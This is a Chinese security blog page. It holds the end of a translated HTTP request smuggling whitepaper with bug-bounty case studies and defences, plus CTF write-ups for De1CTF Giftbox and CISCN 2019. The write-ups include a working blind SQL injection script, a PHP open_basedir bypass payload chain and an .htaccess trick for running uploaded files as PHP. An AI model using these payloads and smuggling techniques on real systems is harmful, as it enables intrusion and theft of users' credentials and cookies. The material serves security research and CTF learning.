<p>如果目标请求看起来像：<br><img src="http://static.zybuluo.com/1160307775/988vcjqwqvtxw9bigenwnjv3/image_1dhv43t4jmhm12pc1rdo1oe61bn86l.png" alt="image_1dhv43t4jmhm12pc1rdo1oe61bn86l.png-23.2kB"></p>
<p>那么，一次CL.TE毒害攻击尝试看起来像是：<br><img src="http://static.zybuluo.com/1160307775/xogz4l7vzvbexan7rd1f1fdv/image_1dhv465pn1if7lah1iqrh5st572.png" alt="image_1dhv465pn1if7lah1iqrh5st572.png-43.3kB"></p>
<p>如果攻击成功，受害者请求（绿色）将得到404响应。</p>
<p>te.cl攻击看起来很相似，但是需要一个封闭块，这意味着我们需要自己指定所有的头，并将受害者请求放在正文中。确保前缀中的内容长度略大于正文：</p>
<p><img src="http://static.zybuluo.com/1160307775/nr7oeij645povxo3wrvdcdrh/image_1dhv4boe01rjp1s361dut1c8o8aj7f.png" alt="image_1dhv4boe01rjp1s361dut1c8o8aj7f.png-59.1kB"></p>
<p>如果一个站点是运行的，另一个用户的请求可能会击中您之前投毒的套接字，这将使您的攻击失败，并可能使用户不安。因此，此过程通常需要进行几次尝试，在高流量站点上可能需要数千次尝试。所以请谨慎和克制行为</p>
<h2 id="Explore"><a href="#Explore" class="headerlink" title="Explore"></a>Explore</h2><p>我将使用一系列真实的网站演示其余的方法。像往常一样，我专门针对那些明确表示愿意通过运行bug奖励计划与安全研究人员合作的公司。多亏了大量涌现的私人程序和不打补丁的习惯，我不得不编写很多案例。在明确声明网站的地方，请记住，它们是少数能够抵御这种攻击的安全网站之一。</p>
<p>现在我们已经确定套接字投毒是可能的，下一步是收集信息，这样我们就可以发动一次全面的攻击。</p>
<p>前端通常会附加和重写HTTP请求头，如x-forwarded-host和x-forwarded-for，以及许多经常难以猜测名称的自定义头。我们的走私请求可能缺少这些头，这可能导致意外的应用程序行为和失败的攻击。</p>
<p>幸运的是，有一个简单的策略另辟蹊径，并且可以看到这些隐藏的header头。这使得我们可以通过手动添加头来恢复功能，甚至可以启用进一步的攻击。</p>
<p>只需在目标应用程序上查找一个反射post参数的页面，对参数进行无序排列，使反射的参数排列最后，稍微增加内容长度，然后将生成的请求进行走私：<br><img src="http://static.zybuluo.com/1160307775/4ie737yk1pu8d49dpv11lrrp/image_1dhvv1j72jm7qdm132e1ekoaim7s.png" alt="image_1dhvv1j72jm7qdm132e1ekoaim7s.png-54.9kB"></p>
<p>绿色请求将在其到达login[email]参数之前由前端重写，因此当它被反射回来时，将泄漏所有内部头：</p>
<p><img src="http://static.zybuluo.com/1160307775/pe2e05lr18lvcyjofytq9j7p/image_1dhvv7g6s1qtlf9ie2l10qs1a8699.png" alt="image_1dhvv7g6s1qtlf9ie2l10qs1a8699.png-45.5kB"></p>
<p>通过增加Content-Length头，您可以逐步检索更多信息，直到您试图读取超过受害者请求末尾的内容，并且受害者的请求会超时。</p>
<p>有些系统完全依赖于前端系统的安全性，一旦您bypass，您就可以直接为所欲为。在login.new relic.com上，“后端”系统是反代的，因此更改走私的主机头授予我访问不同的新relic系统的权限。最初，我访问的每个内部系统都认为我的请求是通过HTTP发送的，并以重定向方式响应的：</p>
<p><img src="http://static.zybuluo.com/1160307775/h3bs3zziu7yq9f3ltsxga4y1/image_1dhvvp3og1rod1iu28cetojpb59m.png" alt="image_1dhvvp3og1rod1iu28cetojpb59m.png-22.2kB"></p>
<p>使用前面观察到的x-forwarded-proto头很容易修复：<br><img src="http://static.zybuluo.com/1160307775/1sy6c955n8mv6iou1qbmcxde/image_1dhvvq6j81n781hslpqtel1o38a3.png" alt="image_1dhvvq6j81n781hslpqtel1o38a3.png-24.7kB"></p>
<p>通过一些目录，我在目标上找到了一个有用的端点：<br><img src="http://static.zybuluo.com/1160307775/7s94vz15z04k0rj1rk1elzvj/image_1dhvvt1km1bb81cd82bou11aufag.png" alt="image_1dhvvt1km1bb81cd82bou11aufag.png-25.3kB"></p>
<p>错误消息清楚地告诉我需要某种类型的授权头，但却没有告诉我字段名。我决定尝试前面看到的“x-nr-external-service”头段：<br><img src="http://static.zybuluo.com/1160307775/sfiuf8gboh57gq3ltxtm6ne8/image_1dhvvvrpe1s7v1b1s1sk2ddcml0at.png" alt="image_1dhvvvrpe1s7v1b1s1sk2ddcml0at.png-29.4kB"></p>
<p>不幸的是，这不起作用——它导致了我们在直接访问该URL时已经看到的相同的禁止响应。这表明前端正在使用x-nr-external-service头来指示请求来自Internet，通过走私因此丢失请求头，我们已经诱使系统认为我们的请求来自内部。这是非常有意义的，但没有直接的用处——我们仍然需要缺少的授权头的名称。</p>
<p>此时，我可以将已处理的请求反射技术应用到一系列端点，直到找到一个具有正确请求头的端点。相反，我决定从上一次我的New Relic6中查询一些笔记，这显示了两个非常宝贵的报头-Server-Gateway-Account-Id and Service- Gateway-Is-Newrelic-Admin。使用这些工具，我可以获得对其内部API的完全管理级访问：<br><img src="http://static.zybuluo.com/1160307775/cj5947kaur85xykxf7725ym6/image_1di00ssli1mfu1381nml92h1mn4ba.png" alt="image_1di00ssli1mfu1381nml92h1mn4ba.png-78.4kB"></p>
<p>New Relic部署了一个修补程序，并将根本原因诊断为F5网关中的一个弱点。据我所知，没有可用的补丁，这意味着在写作的时候这仍然是0day。</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>直接进入内部API确实不错，但它很少是我们唯一的选择。我们还可以针对浏览目标网站的每个人发起大量不同的攻击。</p>
<p>要确定哪些攻击可以应用到其他用户，我们需要了解哪些类型的请求可以被破坏。从“确认”阶段重复套接字中毒测试，但反复调整“受害者”请求，直到它类似于典型的GET请求。您可能会发现，您只能使用某些方法、路径或头毒害请求。另外，尝试从不同的IP地址发出受害者请求-在极少数情况下，您可能会发现您只能对来自同一IP的请求进行毒害。</p>
<p>最后，检查网站是否使用Web缓存-这些可以帮助绕过许多限制，增加我们对哪些资源中毒的控制，并最终增加请求走私漏洞的严重性。</p>
<h3 id="Store"><a href="#Store" class="headerlink" title="Store"></a>Store</h3><p>如果应用程序支持编辑或存储任何类型的文本数据，那么利用就非常容易。通过在受害者的请求前加上一个精心设计的存储请求，我们可以让应用程序保存他们的请求并将其显示给我们，然后窃取任何身份验证cookie/headers。下面是一个以Trello为目标的示例，使用其配置文件编辑端点：</p>
<p><img src="http://static.zybuluo.com/1160307775/txwaqf2l9ruc7nv89gyxljog/image_1di01d7421dui1a81nbepu2btbn.png" alt="image_1di01d7421dui1a81nbepu2btbn.png-54.1kB"></p>
<p>一旦受害者的请求到达，它就会保存在我的个人资料中，暴露他们所有的头和cookie：</p>
<p><img src="http://static.zybuluo.com/1160307775/2622oq8b4q8yery1kpm2s8jw/image_1di01e9oa1c4s19e513t9p564a8c4.png" alt="image_1di01e9oa1c4s19e513t9p564a8c4.png-48.7kB"></p>
<p>使用这种技术的唯一主要目的是丢失“&amp;”之后发生的任何数据，这使得从表单编码的post请求中窃取主体很困难。我花了一段时间试图通过使用可选的请求编码来解决这个限制，最终放弃了，但我仍然怀疑这是可能的。</p>
<p>数据存储的机会并不总是如此明显——在另一个网站上，我可以使用“联系我们”表单，最终触发一封包含受害者请求的电子邮件，并获得2500美元的额外收入。</p>
<h3 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h3><p>能够将一个任意前缀应用到其他人的响应中，也打开了另一种攻击途径——触发一个有害的响应。</p>
<p>使用有害反应有两种主要方法。最简单的方法是发出“攻击”请求，然后等待其他人的请求击中后端套接字并触发有害响应。一种更为棘手但更强大的方法是亲自发出“攻击”和“受害者”请求，并希望对受害者请求的有害响应通过Web缓存保存，并提供给访问同一URL的任何其他人-Web缓存中毒。</p>
<p>在以下每个请求/响应片段中，黑色文本是对第二个（绿色）请求的响应。第一个（蓝色）请求的响应被忽略，因为它不相关。</p>
<h2 id="Upgrading-XSS"><a href="#Upgrading-XSS" class="headerlink" title="Upgrading XSS"></a>Upgrading XSS</h2><p>在审计一个SaaS应用程序时，Param Miner7发现了一个名为saml的参数，Burp scaner证实它易受反射XSS的攻击。反射式XSS本身不错，但在规模上很难利用，因为它需要用户交互。</p>
<p>通过请求走私，我们可以对主动浏览网站的随机用户提供包含XSS的响应，从而实现直接的大规模利用。我们还可以访问authentication headers 和仅HTTP cookie，这可能会让我们转到其他域。</p>
<p><img src="http://static.zybuluo.com/1160307775/l8sr33d0y8t306l6qx5higvw/image_1di01r6qa1iap8ki1vh0gdg17s9d1.png" alt="image_1di01r6qa1iap8ki1vh0gdg17s9d1.png-70.8kB"></p>
<h2 id="Grasping-the-DOM"><a href="#Grasping-the-DOM" class="headerlink" title="Grasping the DOM"></a>Grasping the DOM</h2><p>在<a href="http://www.redhat.com上查找请求走私链的漏洞时，我发现了一个基于DOM的开放重定向，这带来了一个有趣的挑战：" target="_blank" rel="noopener">www.redhat.com上查找请求走私链的漏洞时，我发现了一个基于DOM的开放重定向，这带来了一个有趣的挑战：</a><br><img src="http://static.zybuluo.com/1160307775/xu9tr6kxrkzl7m0t2uvwdlrs/image_1di01vv584rumq9d5r1ormld2de.png" alt="image_1di01vv584rumq9d5r1ormld2de.png-34.5kB"></p>
<p>页面上的一些javascript正在从受害者浏览器的查询字符串中读取“redir”参数，但我如何控制它？请求走私使我们能够控制服务器认为查询字符串是什么，但是受害者的浏览器对查询字符串的认知只是了解用户试图访问哪个页面。</p>
<p>我可以通过链接服务器端的非开放重定向来解决这个问题：</p>
<p><img src="http://static.zybuluo.com/1160307775/klj8f2y8p7hgayr8jvzphtkn/image_1di025q9518k91g5dh8drkna2feb.png" alt="image_1di025q9518k91g5dh8drkna2feb.png-70.3kB"></p>
<p>受害者浏览器将收到一个301重定向到<a href="https://www.redhat.com/assets/x.html?redir=//redat.com@evil.net/，然后执行基于dom的开放重定向并将其转储到evil.net上。" target="_blank" rel="noopener">https://www.redhat.com/assets/x.html?redir=//redat.com@evil.net/，然后执行基于dom的开放重定向并将其转储到evil.net上。</a></p>
<h2 id="CDN-Chaining"><a href="#CDN-Chaining" class="headerlink" title="CDN Chaining"></a>CDN Chaining</h2><p>有些网站使用多层反向代理和cdn。这给了我们额外的机会去同步，这是一直被赞赏的，它也经常增加严重性</p>
<p>一个目标是不知何故地使用两层Akamai，尽管服务器由同一供应商提供，但仍有可能将它们不同步，因此，在受害者网站的Akamai network中提供不同的内容：<br><img src="http://static.zybuluo.com/1160307775/oy6dcrszjf3k5nzxie51n427/image_1di02gpq91n7jc93pii6hsvseo.png" alt="image_1di02gpq91n7jc93pii6hsvseo.png-45.2kB"></p>
<p>同样的概念也适用于SaaS提供商——我能够攻破一个建立在知名SaaS平台上的关键网站，将请求定向到建立在同一平台上的不同系统。</p>
<h2 id="‘Harmless’-responses"><a href="#‘Harmless’-responses" class="headerlink" title="‘Harmless’ responses"></a>‘Harmless’ responses</h2><p>因为请求走私让我们影响对任意请求的响应，一些通常无害的行为成为可利用的。例如，即使是不起眼的开放式重定向，也可以通过将javascript导入重定向到恶意域来危害帐户。</p>
<p>使用307代码的重定向特别有用，因为在发出post请求后接收307的浏览器将把post重新发送到新的目的地。这可能意味着你可以让不知情的受害者直接将他们的明文密码发送到你的网站。</p>
<p>经典的开放式重定向本身就很常见，但是有一种变体在Web中普遍存在，因为它源于Apache和IIS中的默认行为。它很方便地被认为是无害的，被几乎所有人忽视，因为没有像请求走私这样的伴随的弱点，它确实是无用的。如果尝试访问没有尾随斜杠的文件夹，服务器将使用主机头中的主机名进行重定向以附加斜杠：<br><img src="http://static.zybuluo.com/1160307775/fpic6gjvppuog2tlgow0f4gl/image_1di033eund4netio7jsa3nf4f5.png" alt="image_1di033eund4netio7jsa3nf4f5.png-44.4kB"></p>
<p>使用此技术时，请密切关注重定向中使用的协议。您可以使用像x-forwarded-ssl这样的头来影响它。如果它卡在HTTP上，而您攻击的是一个HTTPS站点，那么受害者的浏览器将由于其混合内容保护而阻止连接。有两个已知的例外8-可以完全绕过Internet Explorer的混合内容保护，如果重定向目标在其HSTS缓存中，Safari将自动升级到HTTPS的连接。</p>
<h2 id="Web-Cache-Poisoning"><a href="#Web-Cache-Poisoning" class="headerlink" title="Web Cache Poisoning"></a>Web Cache Poisoning</h2><p>在尝试对特定网站进行基于重定向的攻击几个小时后，我在浏览器中打开了他们的主页以查找更多的攻击面，并在Dev控制台中发现了以下错误：</p>
<p><img src="http://static.zybuluo.com/1160307775/b8jv6t5emd2ty057r7njho6u/image_1di037a5k1iq51f7a19n51jmc600fi.png" alt="image_1di037a5k1iq51f7a19n51jmc600fi.png-18.5kB"></p>
<p>无论从哪台机器加载网站，都会发生此错误，并且IP地址看起来非常熟悉。在我的重定向探测期间，在我的受害者请求之前，有人请求了一个图像文件，而中毒的响应被缓存保存了下来。</p>
<p>这是对潜在影响的一个很好的证明，但总的来说并不是一个理想的结果。除了依赖基于超时的检测，没有办法完全消除意外缓存中毒的可能性。也就是说，为了将风险降到最低，你可以：<br>-确保“受害者”请求有一个缓存阻止程序。</p>
<p>-使用turbo Intruder，尽快发送“受害者”请求。<br>-尝试创建一个前缀来触发反缓存头的响应，或者一个不太可能被缓存的状态代码。<br>-在不常用的前端处实施攻击。</p>
<h2 id="Web-Cache-Deception"><a href="#Web-Cache-Deception" class="headerlink" title="Web Cache Deception++"></a>Web Cache Deception++</h2><p>如果我们不尝试减少攻击者/用户混合响应缓存的机会，而是接受它呢？</p>
<p>我们可以尝试用受害者的cookie获取包含敏感信息的响应，而不是使用设计用于导致有害响应的前缀：<br><img src="http://static.zybuluo.com/1160307775/n6jss7idvvrs8bz0933pb08e/image_1di03lb12var1itka221437galfv.png" alt="image_1di03lb12var1itka221437galfv.png-24.3kB"></p>
<p>前端请求：<br><img src="http://static.zybuluo.com/1160307775/rr9iwmh76f9jexgwfedovzyu/image_1di03ot516ne1j91u041oh61tu5gs.png" alt="image_1di03ot516ne1j91u041oh61tu5gs.png-13.1kB"></p>
<p>当用户对静态资源的请求到达中毒的套接字时，响应将包含其帐户详细信息，并且缓存将通过静态资源保存这些信息。然后，我们可以通过从缓存中加载/static/site.js来检索帐户详细信息。</p>
<p>这实际上是Web缓存欺骗攻击的一个新变体。它在两个关键方面更强大——它不需要任何用户交互，也不需要目标站点允许您使用扩展。唯一的陷阱是攻击者无法确定受害者的反应将落在何处。</p>
<h2 id="PayPal"><a href="#PayPal" class="headerlink" title="PayPal"></a>PayPal</h2><p>由于请求走私连锁缓存中毒，我能够持续劫持众多JavaScript文件，其中之一是在Paypal的登录页面：<a href="https://c.paypal.com/webstatic/r/fb/fb-all-prod.pp2.min.js" target="_blank" rel="noopener">https://c.paypal.com/webstatic/r/fb/fb-all-prod.pp2.min.js</a>.</p>
<p><img src="http://static.zybuluo.com/1160307775/wmoqtjprhf707is1xo7ka1ka/image_1di03u9lu1fb2tur1n51ekl9loh9.png" alt="image_1di03u9lu1fb2tur1n51ekl9loh9.png-61.8kB"></p>
<p>但是有一个问题——PayPal的登录页面使用了<code>script-src</code>的csp，它破坏了我的重定向。<br><img src="http://static.zybuluo.com/1160307775/cpxwv9v85x5usy6th6jdwu98/image_1di040r7764spvs1orqvbk96rhm.png" alt="image_1di040r7764spvs1orqvbk96rhm.png-23.4kB"></p>
<p>起初，这看起来像是纵深防御的胜利。但是，我注意到登录页面在一个动态生成的iframe中加载了c.paypal.com上的一个子页面。此子页没有使用CSP，还导入了我们的有害JS文件。这使我们完全控制了iframe的内容，但是由于同源策略，我们仍然无法从父页面读取用户的Paypal密码。</p>
<p><img src="http://static.zybuluo.com/1160307775/dkyfc1gj4hzy6ihqaqc20wbx/image_1di0433272ms1vie1ond1n1p1eqqi3.png" alt="image_1di0433272ms1vie1ond1n1p1eqqi3.png-40.2kB"></p>
<p>我的同事GarethHeyes随后在paypal.com/us/gifts上发现了一个不使用CSP的页面，并导入了我们中毒的JS文件。通过使用我们的JS重定向c.paypal.com iframe到该URL（并在第三次触发我们的JS），我们最终可以从使用Safari或IE登录的所有人访问父和窃取明文Paypal密码。<br><img src="http://static.zybuluo.com/1160307775/kgm49hw0deq81v5z9k90qsyo/image_1di0462kcnfm1ik4v7v19q81ue0ig.png" alt="image_1di0462kcnfm1ik4v7v19q81ue0ig.png-68.3kB"></p>
<p>PayPal通过配置Akamai拒绝包含传输编码的请求：chunked header，快速地解决了这个漏洞，并授予了18900美元的赏金。</p>
<p>几周后，在发明和测试一些新的去同步技术时，我决定尝试使用一个换行的头文件：<br><img src="http://static.zybuluo.com/1160307775/bsi9yau5mqmjou0cgxvas5iv/image_1di048085cfbp1e3b1hmeeddit.png" alt="image_1di048085cfbp1e3b1hmeeddit.png-5.3kB"></p>
<p>这似乎使转移编码头对于Akamai来说不可见，成功绕过，并再次授予我控制Paypal的登录页面。PayPal迅速应用了一个更稳健的解决方案，并获得了令人印象深刻的20000美元。(译者跪了2333)</p>
<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>另一个目标使用了反向代理链，其中一个没有将’\n’视为有效的头终止符。这意味着他们的网络基础设施中相当大的一部分容易受到走私请求的攻击。我录制了一个演示，演示如何使用非同步来有效地识别和利用Bugzilla安装的副本上的漏洞，该副本包含一些非常敏感的信息。</p>
<p>您可以在本白皮书的在线版本<a href="https://portswigger.net/blog/http-desync-attacks9中找到该视频。" target="_blank" rel="noopener">https://portswigger.net/blog/http-desync-attacks9中找到该视频。</a></p>
<h2 id="Defence"><a href="#Defence" class="headerlink" title="Defence"></a>Defence</h2><p>像往常一样，安全很简单。如果您的网站没有负载均衡器、cdn和反向代理，那么这种技术就不是一种威胁。引入的层越多，就越容易受到攻击。</p>
<p>每当我讨论攻击技术时，我都会被问到HTTPS是否可以阻止它。一如既往，答案是“不”。也就是说，通过将前端服务器配置为专门使用HTTP/2与后端系统通信，或者完全禁用后端连接重用，可以解决此漏洞的所有变体。或者，您可以确保链中的所有服务器使用相同的配置运行相同的Web服务器软件。</p>
<p>可以通过重新配置前端服务器来解决此漏洞的特定实例，以便在继续路由之前将不明确的请求规范化。对于不想让客户受到攻击的客户来说，这可能是唯一现实可行的解决方案，CloudFlare和Fastly似乎成功地应用了它。</p>
<p>对于后端服务器来说，正常化请求不是一个选项——它们需要彻底拒绝不明确的请求，并删除关联的连接。由于拒绝请求比简单地使其正常化更可能影响合法流量，因此我建议重点防止通过前端服务器进行请求走私。</p>
<p>当你的工具对你不利时，有效的防御是不可能的。大多数Web测试工具在发送请求时都会自动“更正”内容长度头段，从而使请求无法走私。在BurpSuite中，您可以使用Repeater menu禁用此行为-确保您选择的工具具有同等的功能。此外，某些公司和bug赏金平台通过Squid之类的代理来转发测试人员的流量，以便进行监控。这些将管理测试人员发起的任何请求走私攻击，确保公司对该漏洞类的覆盖率为零。</p>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>在多年来一直被忽视的研究基础上，我引入了新的技术来取消服务器的同步，并演示了使用大量真实网站作为案例研究来利用结果的新方法。</p>
<p>通过这一点，我已经证明了请求走私是对Web的主要威胁，HTTP请求解析是一个安全关键的功能，容忍不明确的消息是危险的。我还发布了一个方法论和一个开源工具包，帮助人们审计请求走私，证明其影响，并以最小的风险获得奖金。</p>
<p>这一主题仍在研究中，因此我希望本出版物将有助于在未来几年内激发新的去同步技术和开发。</p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol>
<li><a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf" target="_blank" rel="noopener">https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf</a></li>
<li><a href="https://portswigger.net/blog/turbo-intruder-embracing-the-billion-request-attack" target="_blank" rel="noopener">https://portswigger.net/blog/turbo-intruder-embracing-the-billion-request-attack</a></li>
<li><a href="https://tools.ietf.org/html/rfc2616#section-4.4" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc2616#section-4.4</a></li>
<li><a href="https://regilero.github.io/tag/Smuggling/" target="_blank" rel="noopener">https://regilero.github.io/tag/Smuggling/</a></li>
<li><a href="https://github.com/portswigger/desynchronize" target="_blank" rel="noopener">https://github.com/portswigger/desynchronize</a></li>
<li><a href="https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface" target="_blank" rel="noopener">https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface</a> 7. <a href="https://github.com/PortSwigger/param-miner" target="_blank" rel="noopener">https://github.com/PortSwigger/param-miner</a></li>
<li><a href="https://portswigger.net/blog/practical-web-cache-poisoning#hiddenroutepoisoning" target="_blank" rel="noopener">https://portswigger.net/blog/practical-web-cache-poisoning#hiddenroutepoisoning</a> </li>
<li><a href="https://portswigger.net/blog/http-desync-attacks" target="_blank" rel="noopener">https://portswigger.net/blog/http-desync-attacks</a></li>
</ol>
<h2 id="议题原文件"><a href="#议题原文件" class="headerlink" title="议题原文件"></a>议题原文件</h2><p><a href="https://pan.baidu.com/s/1ycNVD8Y3EIr4ayEnM9eqew" target="_blank" rel="noopener">https://pan.baidu.com/s/1ycNVD8Y3EIr4ayEnM9eqew</a></p>

                
            </div>
            <div class="continue">
            <a href="/2019/08/10/HTTP Desync Attacks-Smashing into the Cell Next Door/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/08/06/De1CTF-Giftbox题解/"> 
                    De1CTF-Giftbox题解 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-08-06   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="De1CTF-Giftbox题解"><a href="#De1CTF-Giftbox题解" class="headerlink" title="De1CTF-Giftbox题解"></a>De1CTF-Giftbox题解</h1><p>这次Web题的难度有阶层，<code>SSRF Me</code>是一个验签的绕过调用python的url_open进行ssrf请求、web4是一道n1ctf的原题，也懒得写wp了。还有两道比较难的，一道是ZSX师傅出的calc，统一三个后端的输出结果，过滤了括号。还有一道魔改了ciscn——2019的滑稽云，更改了溢出区的大小+外带结果。</p>
<p>最后就是Giftbox，不得不说，这是我见过最有小情调的ctf题目。做了一个伪unix页面，存在几个bash命令，和一个登陆功能，在登陆处存在sql注入(需要经过双因子认证)。比赛的时候没做出来，趁着赛题没关复现一下(顺便膜爆恩泽师傅orz..)</p>
<p><img src="http://static.zybuluo.com/1160307775/fa8kq5dg6w9kvypaq7gmtn5d/image_1dhfn1f0b1ogo5fs163rsqk1c0a9.png" alt="image_1dhfn1f0b1ogo5fs163rsqk1c0a9.png-979.2kB"></p>
<h2 id="双因子认证"><a href="#双因子认证" class="headerlink" title="双因子认证"></a>双因子认证</h2><p>这种认证第一次见，其实是调用pyotp模块去验证，随便输入会报错<br><img src="http://static.zybuluo.com/1160307775/yqxk48t3uo4tmzrgjt4d30kg/image_1dhfn759ve4c17uv1eqv1rpq876m.png" alt="image_1dhfn759ve4c17uv1eqv1rpq876m.png-203.2kB"></p>
<p>既然是前端发送验证请求，那就应该存在发送的ajax请求包。重点在开发者nodets和请求形式。它提示我们后端用了pyotp.zip的库去验证，而且在请求形式中把secret_key给了我们:<code>GAXG24JTMZXGKZBU</code></p>
<p><img src="http://static.zybuluo.com/1160307775/apyakaxxoilaq4ixhqk9ss1u/image_1dhfn9snj1dtme3d11eea3nm2v13.png" alt="image_1dhfn9snj1dtme3d11eea3nm2v13.png-165.3kB"></p>
<p>队内师傅提醒说，python3的pyotp模块也可以根据key生成验证<br><img src="http://static.zybuluo.com/1160307775/k5n1ymx6sv0p2188k8r01wr3/image_1dhfniaosich1f5b1ptm1jk8t4s1g.png" alt="image_1dhfniaosich1f5b1ptm1jk8t4s1g.png-140.6kB"></p>
<p>赛后看到天枢的师傅用xhr发送请求，即前端爆破就可以直接调用topt函数，也是种不错的思路，学习了。</p>
<p>接着就是一个简单的注入</p>
<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>脚本如下，空格会导致程序判断为参数分隔符，所以用/**/替代</p>
<pre><code>#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import pyotp as pyotp
import string

totp = pyotp.TOTP(&#39;GAXG24JTMZXGKZBU&#39;, 8, interval=5)


def curl(payload):
    r = requests.post(&#39;http://222.85.25.41:8090/shell.php&#39;, params={&#39;a&#39;: &#39;login admin\&#39;/**/and/**/(&#39; + payload + &#39;)/**/and/**/\&#39;1\&#39;=\&#39;1 admin&#39;, &#39;totp&#39;: totp.now()},
                      data={&#39;dir&#39;: &#39;/&#39;, &#39;pos&#39;: &#39;/&#39;, &#39;filename&#39;: &#39;usage.md&#39;})
    if &#39;password&#39; in r.text:
        return True
    else:
        return False


def sqli():
    for i in range(0, 2):
        # db_data = &quot;SELECT/**/table_name/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=\&#39;giftbox\&#39;/**/LIMIT/**/{},1&quot;.format(
        #     i)
        # db_data = &quot;SELECT/**/column_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_schema=\&#39;giftbox\&#39;/**/and/**/table_name=\&#39;users\&#39;/**/LIMIT/**/{},1&quot;.format(
        #     i)
        db_data = &quot;select/**/password/**/from/**/giftbox.users/**/where/**/username/**/=/**/&#39;admin&#39;/**/limit/**/{},1&quot;.format(
            i)
        db_res = &quot;&quot;

        for y in range(1, 64):
            for c in string.printable:
                db_res_payload = &quot;substr((&quot; + db_data + &quot;),%d,1)/**/=/**/&#39;%s&#39;&quot; % (y,c)
                if curl(db_res_payload):
                    db_res += c
                    print(&quot;&gt; &quot; + db_res)
                    break
                else:pass
            if db_res == &quot;&quot;:
                break


if __name__ == &#39;__main__&#39;:
    sqli()</code></pre><p>最后注入password字段得到一个hint为<code>hinT{g1ve_u_hi33en_c0mm3nd-sh0w_hiiintttt_23333}</code>，登陆成功同时提示</p>
<p><img src="http://static.zybuluo.com/1160307775/y3uyi4qslzpihrrxqpk5w7x1/image_1dhi8qiij18ve18991q95u1skfb1m.png" alt="image_1dhi8qiij18ve18991q95u1skfb1m.png-86kB"></p>
<h2 id="Bypass-open-dir"><a href="#Bypass-open-dir" class="headerlink" title="Bypass open_dir"></a>Bypass open_dir</h2><p>同时题目存在targeting命令，具体用法如下。结合之前的提示，推测是对每一个target进行一次eval的操作，因为targeting不允许存在双引号，所以用复杂变量${xxx(xxx)}的形式代替</p>
<p><img src="http://static.zybuluo.com/1160307775/4q86j7w2c84e21wjkvrk4bsr/image_1dhic3q29as9fln24sr29vts9.png" alt="image_1dhic3q29as9fln24sr29vts9.png-411.3kB"></p>
<p>但是没有执行到system(whoami)，推测是有open_dir，用网上的方法bypass:<a href="https://www.4hou.com/web/17357.html" target="_blank" rel="noopener">从PHP底层看open_basedir bypass</a></p>
<p>最后的payload如下，因为有长度限制，进行变量拼接</p>
<pre><code>targeting a chdir
targeting b css
targeting c {$a($b)}
targeting d ini_set
targeting e open_basedir
targeting f ..
targeting g {$d($e,$f)}
targeting h {$a($f)}
targeting i {$a($f)}
targeting j base64_
targeting k decode
targeting l $j$k
targeting m Ly8v
targeting n {$l($m)}
targeting o {$d($e,$n)}
targeting p print_r
targeting q file_get_
targeting r contents
targeting s $q$r
targeting t flag
targeting u {$p($s($t))}
launch</code></pre><p><img src="http://static.zybuluo.com/1160307775/uefh1iezrvio5k3p7kn68w9o/image_1dhiec48lrbmsku1m3eu9pbjm2p.png" alt="image_1dhiec48lrbmsku1m3eu9pbjm2p.png-128.9kB"></p>
<p>再次膜恩泽师傅..</p>

                
            </div>
            <div class="continue">
            <a href="/2019/08/06/De1CTF-Giftbox题解/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/07/29/CISCN 2019 Final Web11复盘/"> 
                    CISCN 2019 Final Web11题解 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-07-29   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="CISCN-2019-Final-Web11复盘"><a href="#CISCN-2019-Final-Web11复盘" class="headerlink" title="CISCN 2019 Final Web11复盘"></a>CISCN 2019 Final Web11复盘</h1><p>题目本身结合了很多知识点，比赛没做出来，这里进行复盘分析。</p>
<p>题目地址：<a href="http://web65.buuoj.cn/" target="_blank" rel="noopener">http://web65.buuoj.cn/</a><br>题目源码：<a href="https://github.com/imagemlt/CISCN_2019_final_pmarkdown.git" target="_blank" rel="noopener">https://github.com/imagemlt/CISCN_2019_final_pmarkdown.git</a></p>
<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>题目功能点很清晰：上传md文件、解析md文件为html(通过php拓展)</p>
<p>在Posts目录存在的.htaccess文件，表明md以php解析，不难想思路就是上传md来getshell</p>
<pre><code>AddType application/x-httpd-php .md</code></pre><p>但是上传是受到本地限制，也是这道题核心的考点。<br><img src="http://static.zybuluo.com/1160307775/tv820qzlzqhref82quabuss7/image_1dgtncrha8qnb4qjv51vlahbj26.png" alt="image_1dgtncrha8qnb4qjv51vlahbj26.png-120.9kB"></p>
